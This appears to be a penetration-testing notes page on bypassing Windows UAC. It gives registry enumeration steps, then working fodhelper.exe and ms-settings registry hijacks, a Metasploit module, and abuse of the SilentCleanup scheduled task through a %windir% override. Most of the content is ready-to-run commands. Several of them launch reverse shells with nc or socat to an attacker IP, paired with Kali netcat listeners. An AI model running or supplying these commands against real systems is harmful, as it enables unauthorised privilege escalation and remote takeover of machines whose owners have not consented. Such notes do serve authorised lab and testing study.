---
description: >-
  The UAC bypass is needed in the following situation: the UAC is activated,
  your process is running in a medium integrity context, and your user belongs
  to the administrators group.
---

# UAC Bypass

### Enumeration

Confirm UAC by reading the registry.&#x20;

```bash
CMD> reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Now notice the three highlighted keys above and their values:

1. `EnableLUA` tells us whether UAC is enabled. If 0 we don’t need to bypass it at all can just PsExec to SYSTEM. If it’s 1 however, then check the other 2 keys
2. `ConsentPromptBehaviorAdmin` can theoretically take on [6 possible values](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/341747f5-6b5d-4d30-85fc-fa1cc04038d4) (readable explanation [here](https://www.tenforums.com/tutorials/112621-change-uac-prompt-behavior-administrators-windows.html)), but from configuring the UAC slider in Windows settings it takes on either 0, 2 or 5.
3. `PromptOnSecureDesktop` is binary, either 0 or 1.

Also confirm if you have this type of situation that your process is running on an administrative accout but in a standard user context.&#x20;

```
whoami /priv
whoami /groups | findstr /i admin
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

### UAC disabled

If UAC is already disabled (`ConsentPromptBehaviorAdmin` is **`0`**) you can **execute a reverse shell with admin privileges** (high integrity level) using something like:

{% code overflow="wrap" %}
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
{% endcode %}

### Exploitation

#### Manual - fodhelper.exe (Defender might come in and catch this registry modification)

{% code overflow="wrap" %}
```bash
# @Target
CMD> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
CMD> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.2.54.119:4444 EXEC:cmd.exe,pipes"
CMD> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
CMD> reg add %REG_KEY% /d %CMD% /f

# @ Kali
Kali> rlwrap nc -nlvp 4444

# @Target
CMD> fodhelper.exe
```
{% endcode %}

#### Manual - PowerShell (Better) &#x20;

{% code overflow="wrap" %}
```bash
CMD> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.2.54.119:4445 EXEC:cmd.exe,pipes"
CMD> reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
CMD> reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f

# @Kali
Kali> rlwrap nc -nlvp 4444

# @Target
CMD> fodhelper.exe
```
{% endcode %}

#### Metasploit

```
msf6 > use exploit/windows/local/bypassuac_eventvwr
```

The easiest way of manual UAC bypass is simply uploading `bypassuac-x86.exe` or `bypassuac-x64.exe` and execute it. Locate these two executables in your system:

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

## Bypassing Always Notify

If UAC is configured on the "Always Notify" level, fodhelper and similar apps won't be of any use as they will require the user to go through the UAC prompt to elevate. We'll be abusing a scheduled task that can be run by any user but will execute with the highest privileges available to the caller.&#x20;

Scheduled tasks are an exciting target. By design, they are meant to be run without any user interaction (independent of the UAC security level), so asking the user to elevate a process manually is not an option. Any scheduled tasks that require elevation will automatically get it without going through a UAC prompt.

{% code overflow="wrap" %}
```bash
# @Kali
nc -lvp 4446

# @Target
CMD> reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:10.2.54.119:4446 EXEC:cmd.exe,pipes &REM " /f
CMD> schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```
{% endcode %}
